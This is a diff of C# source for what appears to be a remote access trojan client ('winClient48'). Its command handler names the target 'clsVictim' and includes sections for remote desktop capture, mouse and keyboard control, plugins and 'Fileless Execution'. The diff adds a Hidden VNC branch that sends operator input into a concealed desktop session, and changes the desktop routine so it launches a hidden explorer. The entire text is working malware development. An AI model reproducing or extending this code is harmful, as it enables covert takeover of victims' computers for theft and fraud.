@@ -1624,7 +1624,7 @@ namespace winClient48
 
                             send_screenshot = true;
                             send_stopped = false;
-                            new Thread(() => DesktopStart(v, device_name, width, height)).Start();
+                            new Thread(() => fnDesktopStart(v, device_name, width, height)).Start();
                         }
                         else
                         {
@@ -1641,6 +1641,7 @@ namespace winClient48
                         m_nDesktopDelay = nDelay;
                     }
                 }
+
                 #endregion
                 #region Mouse Control
 
@@ -1655,23 +1656,10 @@ namespace winClient48
                     }
                     else if (cmd[1] == "move")
                     {
-                        //Cursor.Position = new Point(int.Parse(cmd[2]), int.Parse(cmd[3]));
-
-                        int x = int.Parse(cmd[2]);
-                        int y = int.Parse(cmd[3]);
-
-                        try
-                        {
-                            funcHvncSession.fnHandleMouseInput("move", x, y);
-                        }
-                        catch (Exception ex)
-                        {
-
-                        }
+                        Cursor.Position = new Point(int.Parse(cmd[2]), int.Parse(cmd[3]));
                     }
                     else if (cmd[1] == "btn")
                     {
-                        /*
                         switch (cmd[2])
                         {
                             case "RD":
@@ -1696,23 +1684,6 @@ namespace winClient48
                                 funcMouse.MouseSC(int.Parse(cmd[3]));
                                 break;
                         }
-                        */
-
-                        string action = cmd[2]; //"LD", "LU", etc.
-                        int x = int.Parse(cmd[3]);
-                        int y = int.Parse(cmd[4]);
-
-                        if (action == "SC")
-                        {
-                            int delta = int.Parse(cmd[5]);
-                            IntPtr wParam = (IntPtr)((delta << 16));
-                            IntPtr hWnd = WinAPI.WindowFromPoint(x, y);
-                            WinAPI.PostMessage(hWnd, 0x020A, wParam, (IntPtr)((y << 16) | (x & 0xFFFF)));
-                        }
-                        else
-                        {
-                            funcHvncSession.fnHandleMouseInput(action, x, y);
-                        }
                     }
                 }
 
@@ -1729,7 +1700,6 @@ namespace winClient48
 
                     if (cmd[1] == "vk")
                     {
-                        /*
                         Keys key = (Keys)int.Parse(cmd[3]);
                         if (cmd[2] == "down")
                         {
@@ -1739,11 +1709,6 @@ namespace winClient48
                         {
                             keyboard.KeyUp(key);
                         }
-                        */
-
-                        string action = cmd[2];
-                        int vk = int.Parse(cmd[3]);
-                        funcHvncSession.fnHandleKeyboardInput(action, vk);
                     }
                     else if (cmd[1] == "enable")
                     {
@@ -2666,6 +2631,7 @@ namespace winClient48
                 }
 
                 #endregion
+                #region Plugin
 
                 else if (cmd[0] == "plugin")
                 {
@@ -2789,6 +2755,7 @@ namespace winClient48
                     }
                 }
 
+                #endregion
                 #region Fileless Execution
 
                 else if (cmd[0] == "fle") //Fileless Execution
@@ -2999,6 +2966,58 @@ namespace winClient48
                 }
 
                 #endregion
+                #region HVNC
+
+                else if (cmd[0] == "hvnc") // Hidden Virtual Network Computing
+                {
+                    if (cmd[1] == "window")
+                    {
+                        if (cmd[2] == "start")
+                        {
+
+                        }
+                        else if (cmd[2] == "stop")
+                        {
+
+                        }
+                        else if (cmd[2] == "close")
+                        {
+
+                        }
+                    }
+                    else if (cmd[1] == "mouse")
+                    {
+                        string action = cmd[2]; // "MOVE", "LD", "LU", etc.
+                        int x = int.Parse(cmd[3]);
+                        int y = int.Parse(cmd[4]);
+                        int delta = int.Parse(cmd[5]); // "SC"
+
+                        try
+                        {
+                            funcHvncSession.fnHandleMouseInput(action, x, y);
+                        }
+                        catch (Exception ex)
+                        {
+
+                        }
+                    }
+                    else if (cmd[1] == "keyboard")
+                    {
+                        string action = cmd[2];
+                        int vk = int.Parse(cmd[3]);
+
+                        try
+                        {
+                            funcHvncSession.fnHandleKeyboardInput(action, vk);
+                        }
+                        catch (Exception ex)
+                        {
+
+                        }
+                    }
+                }
+
+                #endregion
             }
             catch (Exception ex)
             {
@@ -3134,9 +3153,10 @@ namespace winClient48
         /// <param name="device_name"></param>
         /// <param name="width"></param>
         /// <param name="height"></param>
-        void DesktopStart(clsVictim v, string device_name, int width, int height)
+        void fnDesktopStart(clsVictim v, string device_name, int width, int height)
         {
             funcHvncSession.fnStartExplorer();
+
             while (is_connected && send_screenshot)
             {
                 /*
